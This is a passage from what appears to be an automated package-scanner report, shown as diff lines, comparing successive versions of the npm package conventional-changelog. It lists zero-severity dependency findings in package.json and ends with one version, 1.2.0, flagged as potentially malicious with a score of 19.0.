+		File(s):
+			package/package.json
+				Location(s):
+					42:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-3.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					43:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-2.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					44:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jquery-3.0.4
+		File(s):
+			package/package.json
+				Location(s):
+					45:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-2.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					46:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-2.0.2
+		File(s):
+			package/package.json
+				Location(s):
+					47:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.0.1 to conventional-changelog-3.0.2:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.1.2
+		File(s):
+			package/package.json
+				Location(s):
+					41:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.0.2 to conventional-changelog-3.0.3:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.1.3
+		File(s):
+			package/package.json
+				Location(s):
+					41:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.0.3 to conventional-changelog-3.0.4:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.1.4
+		File(s):
+			package/package.json
+				Location(s):
+					41:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.0.4 to conventional-changelog-3.0.5:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.1.5
+		File(s):
+			package/package.json
+				Location(s):
+					41:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.0.5 to conventional-changelog-3.0.6:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-5.0.3
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.1.6
+		File(s):
+			package/package.json
+				Location(s):
+					41:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.0.6 to conventional-changelog-3.1.1:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-1.1.1
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-3.0.2
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-2.1.1
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.1 to conventional-changelog-3.1.2:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.2.1
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.2 to conventional-changelog-3.1.3:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.2.2
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.3 to conventional-changelog-3.1.4:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-1.1.2
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.4 to conventional-changelog-3.1.5:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-2.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.5 to conventional-changelog-3.1.6:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.6 to conventional-changelog-3.1.7:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-3.0.1
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.7 to conventional-changelog-3.1.8:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-3.0.2
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.8 to conventional-changelog-3.1.9:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-3.2.3
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.9 to conventional-changelog-3.1.10:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-2.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.10 to conventional-changelog-3.1.12:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-5.0.5
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-2.0.3
+		File(s):
+			package/package.json
+				Location(s):
+					39:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-2.0.3
+		File(s):
+			package/package.json
+				Location(s):
+					40:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.2.1
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.0.2
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-2.0.4
+		File(s):
+			package/package.json
+				Location(s):
+					43:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-3.0.4
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jquery-3.0.6
+		File(s):
+			package/package.json
+				Location(s):
+					46:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-2.0.3
+		File(s):
+			package/package.json
+				Location(s):
+					47:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.12 to conventional-changelog-3.1.13:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.2.2
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.0.3
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-2.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.13 to conventional-changelog-3.1.14:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-5.0.6
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.2.3
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.14 to conventional-changelog-3.1.15:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.1
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.15 to conventional-changelog-3.1.16:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.2
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.16 to conventional-changelog-3.1.17:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.3
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.17 to conventional-changelog-3.1.18:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.4
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.18 to conventional-changelog-3.1.19:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.5
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.19 to conventional-changelog-3.1.20:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-5.0.10
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-2.0.7
+		File(s):
+			package/package.json
+				Location(s):
+					39:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-2.0.7
+		File(s):
+			package/package.json
+				Location(s):
+					40:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.3.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.6
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-2.0.8
+		File(s):
+			package/package.json
+				Location(s):
+					43:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-3.0.8
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-2.0.5
+		File(s):
+			package/package.json
+				Location(s):
+					45:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jquery-3.0.10
+		File(s):
+			package/package.json
+				Location(s):
+					46:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-2.0.7
+		File(s):
+			package/package.json
+				Location(s):
+					47:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-2.3.4
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.20 to conventional-changelog-3.1.21:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.7
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.21 to conventional-changelog-3.1.22:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-5.0.11
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.3.1
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.1.8
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-2.0.8
+		File(s):
+			package/package.json
+				Location(s):
+					47:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.22 to conventional-changelog-3.1.23:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.4.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.2.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.23 to conventional-changelog-3.1.24:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-5.0.12
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-2.0.8
+		File(s):
+			package/package.json
+				Location(s):
+					39:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-2.0.8
+		File(s):
+			package/package.json
+				Location(s):
+					40:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-4.5.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-4.2.1
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-2.0.9
+		File(s):
+			package/package.json
+				Location(s):
+					43:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-3.0.9
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-2.0.6
+		File(s):
+			package/package.json
+				Location(s):
+					45:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jquery-3.0.11
+		File(s):
+			package/package.json
+				Location(s):
+					46:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-2.0.9
+		File(s):
+			package/package.json
+				Location(s):
+					47:38
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-3.1.24 to conventional-changelog-3.1.25:
+---------------------------------------------------------
+
+
+Severity sum:
+=> All queries: 0
+=> Distinct queries: 0
+
+
+Comparing conventional-changelog-3.1.25 to conventional-changelog-4.0.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-6.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					39:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					40:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-6.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-5.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					43:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					45:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jquery-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					46:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					47:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-3.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-4.0.0 to conventional-changelog-5.0.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-angular-7.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					38:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-atom-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					39:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-codemirror-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					40:42
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-7.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-6.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-ember-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					43:37
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-eslint-5.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					44:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-express-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					45:39
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jquery-5.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					46:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-jshint-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					47:38
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-4.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+Comparing conventional-changelog-5.0.0 to conventional-changelog-5.1.0:
+---------------------------------------------------------
+
+js/dependencies (severity: 0.0):
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-conventionalcommits-7.0.2
+		File(s):
+			package/package.json
+				Location(s):
+					41:51
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-core-7.0.0
+		File(s):
+			package/package.json
+				Location(s):
+					42:36
+	1 new occurence(s) of finding: Found dependency: conventional-changelog-preset-loader-4.1.0
+		File(s):
+			package/package.json
+				Location(s):
+					48:45
+
+
+Severity sum:
+=> All queries: 0.0
+=> Distinct queries: 0.0
+
+
+
+-------------------------------
+-------------------------------
+
+Versions flagged as potential malicious:
+
+conventional-changelog-1.2.0 with score: 19.0
